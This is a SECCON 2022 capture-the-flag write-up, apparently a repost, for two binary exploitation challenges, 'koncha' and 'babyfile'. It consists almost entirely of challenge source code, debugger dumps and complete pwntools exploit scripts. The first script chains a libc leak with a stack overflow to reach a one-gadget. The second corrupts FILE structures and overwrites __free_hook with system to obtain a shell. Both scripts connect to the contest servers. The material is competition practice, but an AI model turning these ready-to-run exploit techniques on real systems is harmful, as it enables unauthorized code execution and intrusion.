# SECCON 2022 Writeup

> 原文: https://www.ctfiot.com/74039.html
> ID: 74039


```
    #include <stdio.h>
    #include 

int main() {
 char name[0x30], country[0x20];

 /* Ask name (accept whitespace) */
 puts("Hello! What is your name?");
 scanf("%[^\n]s", name);
 printf("Nice to meet you, %s!\n", name);

 /* Ask country */
 puts("Which country do you live in?");
 scanf("%s", country);
 printf("Wow, %s is such a nice country!\n", country);

 /* Painful goodbye */
 puts("It was nice meeting you. Goodbye!");
 return 0;
}

__attribute__((constructor))
void setup(void) {
 setbuf(stdin, NULL);
 setbuf(stdout, NULL);
 alarm(180);
}
ubuntu@ubuntu:~/ctf/koncha/bin$ ./chall
Hello! What is your name?
AAAAAAa
Nice to meet you, AAAAAAa!
Which country do you live in?
BBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Wow, BBBBBBBBBBBBBBBBBBBBBBBBBBBBB is such a nice country!
It was nice meeting you. Goodbye!
gdb-peda$ checksec
CANARY : disabled
FORTIFY : disabled
NX : ENABLED
PIE : disabled
RELRO : FULL
from pwn import *

elf=ELF("/home/ubuntu/ctf/koncha/bin/chall")
libc=ELF("/home/ubuntu/ctf/koncha/lib/libc.so.6")

    #p=process("/home/ubuntu/ctf/koncha/bin/chall"
# , aslr=False
# ,env={"LD_PRELOAD" : "/home/ubuntu/ctf/koncha/lib/libc.so.6"} )

    #gdb.attach(p)
p=remote("koncha.seccon.games",9001)

p.sendlineafter("Hello! What is your name?", "")
print(hexdump(p.recvline()))
p.recvuntil(b"\x2c\x20")
libc_base=u64(p.recv(6).ljust(8, b"\x00"))-0x1f12e8
log.info("libc base is :"+hex(libc_base))
one_gadget=0xe3b01
p.sendlineafter("Which country do you live in?", cyclic(88)+p64(libc_base+one_gadget))
p.interactive()
    #include <stdio.h>
    #include <stdlib.h>
    #include 

static int menu(void);
static int getnline(char *buf, int size);
static int getint(void);

    #define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)

int main(void){
	FILE *fp;

	alarm(30);

	write_str("Play with FILE structure\n");

	if(!(fp = fopen("/dev/null", "r"))){
 write_str("Open error");
 return -1;
	}
	fp->_wide_data = NULL;

	for(;;){
 switch(menu()){
 case 0:
 goto END;
 case 1:
 fflush(fp);
 break;
 case 2:
 {
 unsigned char ofs;
 write_str("offset: ");
 if((ofs = getint()) & 0x80)
 ofs |= 0x40;
 write_str("value: ");
 ((char*)fp)[ofs] = getint();
 }
 break;
 }
 write_str("Done.\n");
	}

END:
	write_str("Bye!");
	_exit(0);
}

static int menu(void){
	write_str("\nMENU\n"
 "1. Flush\n"
 "2. Trick\n"
 "0. Exit\n"
 "> ");

	return getint();
}

static int getnline(char *buf, int size){
	int len;

	if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
 return -1;

	if(buf[len-1]=='\n')
 len--;
	buf[len] = '\0';

	return len;
}

static int getint(void){
	char buf[0x10] = {};

	getnline(buf, sizeof(buf));
	return atoi(buf);
}
ubuntu@ubuntu:~/ctf/babyfile/babyfile$ ./chall
Play with FILE structure

MENU
1. Flush
2. Trick
0. Exit
> 1
Done.

MENU
1. Flush
2. Trick
0. Exit
> 2
offset: 123
value: 456
Done.

MENU
1. Flush
2. Trick
0. Exit
gdb-peda$ checksec
CANARY : ENABLED
FORTIFY : disabled
NX : ENABLED
PIE : disabled
RELRO : FULL
pwndbg> p *((struct _IO_FILE_plus *)0x5555555592a0)
$1 = {
 file = {
 _flags = -72539000,
 _IO_read_ptr = 0x0,
 _IO_read_end = 0x0,
 _IO_read_base = 0x0,
 _IO_write_base = 0x0,
 _IO_write_ptr = 0x0,
 _IO_write_end = 0x0,
 _IO_buf_base = 0x0,
 _IO_buf_end = 0x0,
 _IO_save_base = 0x0,
 _IO_backup_base = 0x0,
 _IO_save_end = 0x0,
 _markers = 0x0,
 _chain = 0x1555554f26a0 <_IO_2_1_stderr_>,
 _fileno = 3,
 _flags2 = 0,
 _old_offset = 0,
 _cur_column = 0,
 _vtable_offset = 0 '\000',
 _shortbuf = "",
 _lock = 0x555555559380,
 _offset = -1,
 _codecvt = 0x0,
 _wide_data = 0x0,
 _freeres_list = 0x0,
 _freeres_buf = 0x0,
 __pad5 = 0,
 _mode = 0,
 _unused2 = '\000' <repeats 19 times>
 },
 vtable = 0x1555554ee600 <_IO_file_jumps>
}
pwndbg> p *((struct _IO_jump_t *) 0x1555554ee600)
$2 = {
 __dummy = 0,
 __dummy2 = 0,
 __finish = 0x155555364070 <_IO_new_file_finish>,
 __overflow = 0x155555364e40 <_IO_new_file_overflow>,
 __underflow = 0x155555364b30 <_IO_new_file_underflow>,
 __uflow = 0x155555365de0 <__GI__IO_default_uflow>,
 __pbackfail = 0x155555367300 <__GI__IO_default_pbackfail>,
 __xsputn = 0x155555363680 <_IO_new_file_xsputn>,
 __xsgetn = 0x155555363330 <__GI__IO_file_xsgetn>,
 __seekoff = 0x155555362960 <_IO_new_file_seekoff>,
 __seekpos = 0x155555366530 <_IO_default_seekpos>,
 __setbuf = 0x155555362620 <_IO_new_file_setbuf>,
 __sync = 0x1555553624b0 <_IO_new_file_sync>,
 __doallocate = 0x155555356b90 <__GI__IO_file_doallocate>,
 __read = 0x1555553639b0 <__GI__IO_file_read>,
 __write = 0x155555362f40 <_IO_new_file_write>,
 __seek = 0x1555553626f0 <__GI__IO_file_seek>,
 __close = 0x155555362610 <__GI__IO_file_close>,
 __stat = 0x155555362f30 <__GI__IO_file_stat>,
 __showmanyc = 0x1555553674a0 <_IO_default_showmanyc>,
 __imbue = 0x1555553674b0 <_IO_default_imbue>
}
gdb-peda$ p *((struct _IO_FILE_plus *) 0x56427f01b2a0)
$1 = {
 file = {
 _flags = 0xfbad2088,
 _IO_read_ptr = 0x56427f01b480 "",
 _IO_read_end = 0x56427f01b480 "",
 _IO_read_base = 0x56427f01b480 "",
 _IO_write_base = 0x56427f01b480 "",
 _IO_write_ptr = 0x56427f01b480 "",
 _IO_write_end = 0x56427f01d480 "",
 _IO_buf_base = 0x56427f01b480 "",
 _IO_buf_end = 0x56427f01d480 "",
 _IO_save_base = 0x56427f01b480 "",
 _IO_backup_base = 0x56427f01d510 "",
 _IO_save_end = 0x56427f01b480 "",
 _markers = 0x0,
 _chain = 0x7f6a7e2fb5c0 <_IO_2_1_stderr_>,
 _fileno = 0x0,
 _flags2 = 0x0,
 _old_offset = 0x0,
 _cur_column = 0x0,
 _vtable_offset = 0x0,
 _shortbuf = "",
 _lock = 0x56427f01b380,
 _offset = 0xffffffffffffffff,
 _codecvt = 0x0,
 _wide_data = 0x0,
 _freeres_list = 0x0,
 _freeres_buf = 0x0,
 __pad5 = 0x0,
 _mode = 0x0,
 _unused2 = '\000' <repeats 19 times>
 },
 vtable = 0x7f6a7e2f74b0 <_IO_file_jumps+16>
}
['0x2e656e6f44']
['0x55b4bc5e2480', '0x55b4bc5e2480', '0x55b4bc5efe80', '0x55b4bc5e4480', '0x55b4bc5e2480', '0x55b4bc5e4480', '0x55b4bc5e2480', '0x55b4bc5e4510', '0x55b4bc5e2480', '0x7fa89316e5c0', '0x55b4bc5e2380', '0xffffffffffffffff', '0x7fa89316a4a0', '0x7fa893174580', '0x7fa893169f60', '0x2e656e6f44']
[*] heap leak:
0x55b4bc5e2000 libc_leak:
0x7fa892f81000
[*] Switching to interactive mode
 Done.
from pwn import *

elf=ELF("/home/ubuntu/ctf/babyfile/babyfile/chall")
libc=ELF("/home/ubuntu/ctf/babyfile/babyfile/libc-2.31.so")

    #p=process("/home/ubuntu/ctf/babyfile/babyfile/chall"
# , aslr=True
# ,env={"LD_PRELOAD" : "/home/ubuntu/ctf/babyfile/babyfile/libc-2.31.so"} )

p=remote("babyfile.seccon.games",3157)

    #gdb.attach(p)

def flush():
 p.sendlineafter(">", "1")
 return

def trick(offset, value):
 p.sendlineafter(">", "2")
 p.sendlineafter("offset:", str(offset))
 p.sendlineafter("value:", str(value))
 return

_IO_read_ptr = 0x8
_IO_read_end = 0x10
_IO_read_base = 0x18
_IO_write_base = 0x20
_IO_write_ptr = 0x28
_IO_write_end = 0x30
_IO_buf_base = 0x38
_IO_buf_end = 0x40
_IO_save_base=0x48
_fileno=0x70

_mode=0xc0
vtable = 0xd8
free_speace=0xe0

# at first we would like to set something in __IO_read_base
# in order to do so, I want to call __do_allocate_buffer

trick(0, 0x88)
trick(1, 0x20)
trick(_mode, 0x1)
trick(_IO_write_base, 0x100)
trick(_IO_read_ptr , 0x100)
trick(_fileno, 0x00)
trick(vtable, 0xa8)
flush()

# avoid _IO_doallocbuf and call _IO_underflow to set read_base
trick(_IO_write_base, 0xff)
trick(vtable, 0x60)
flush()

def getheap(base):
 trick(vtable, 0xa0)
 trick(_mode, 0x0)
 trick(_IO_write_ptr+0x1, 0xfe)
 trick(_IO_write_base, 0x00)
 trick(_IO_write_base+1, base) ## difficult
 trick(_IO_read_end, 0x00)
 trick(_IO_read_end+1, base) ## difficult
 trick(_fileno, 0x01)
 trick(0, 0x84)
 trick(1, 0x20)
 flush()
 tmp=[u64(i.strip().ljust(8, b"\x00")) for i in p.recvline().split(b"\x00") if len(i)>5]
 #print(hexdump(p.readline()))
 print([hex(i) for i in tmp])
 return tmp

# blute force to get heap/libc leak
for i in range(16):
 tmp=getheap(i*0x10)
 if len(tmp)>2:
 break

heap_leak=tmp[0]-0x480
libc_leak=tmp[len(tmp)-2]-0x1e8f60

log.info("heap leak:" + hex(heap_leak) + " libc_leak:"+hex(libc_leak))

# use finish to call puts with appropriate argument
# arbitrage RRW from _IO_write_base -> read_base
addr_system=libc_leak+libc.symbols["system"]
trick(0, 0x18)
trick(1, 0x90)

trick(_fileno, 0x04)
trick(vtable, 0x50)
trick(_mode, 0x0)
trick(_IO_read_end, 0xF)

# set system address free_space
target=addr_system
for i in range(8):
 low=target%0x100
 target = target / 0x100
 trick(free_speace+i,low)

# set binsh
target=0x68732f6e69622f
for i in range(8):
 low=target%0x100
 target = target / 0x100
 trick(free_speace+8+i,low)

# this will be argument when we call free
target = heap_leak+0x388
for i in range(8):
 low = target % 0x100
 target = target / 0x100
 trick(_IO_save_base + i, low)

# target FROM
target=heap_leak+0x380
for i in range(8):
 low=target%0x100
 target = target / 0x100
 trick(_IO_write_base+i,low)

# target TO
target=libc_leak+libc.symbols["__free_hook"]
for i in range(8):
 low=target%0x100
 target = target / 0x100
 trick(_IO_buf_base+i,low)

# target TO
target=libc_leak+libc.symbols["__free_hook"]+0x20
for i in range(8):
 low=target%0x100
 target = target / 0x100
 trick(_IO_buf_end+i,low)

flush()

p.interactive()
```
